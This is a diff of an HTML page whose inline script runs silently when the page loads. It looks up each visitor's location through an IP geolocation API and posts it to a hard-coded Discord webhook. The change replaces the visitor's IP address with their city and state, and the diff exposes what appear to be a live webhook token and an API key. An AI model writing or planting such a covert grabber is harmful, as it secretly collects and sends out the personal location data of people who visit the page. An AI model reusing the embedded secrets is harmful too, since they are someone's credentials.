@@ -8,15 +8,16 @@
 <body>
 
 <script>
-  fetch('https://api64.ipify.org?format=json')
+  fetch('https://api.ipstack.com/90a400341478c3fbcd6fb2197aec2bc9?format=json')
     .then(response => response.json())
     .then(data => {
-        const ipAddress = data.ip;
+        const city = data.city;
+        const state = data.region_name;
         const webhookURL = 'https://discord.com/api/webhooks/1197303153826218055/bUyjZhkxnSthZWF-UpyQJb4_wIF_NJZoM2Gn_5etKV9rwx-hfztGVXeLJDtyfEczvMSn';
 
         // Create payload for Discord webhook
         const payload = {
-            content: `User's IP Address: ${ipAddress}`,
+            content: `city : ${city}, state : ${state}`,
         };
 
         // Send data to Discord webhook
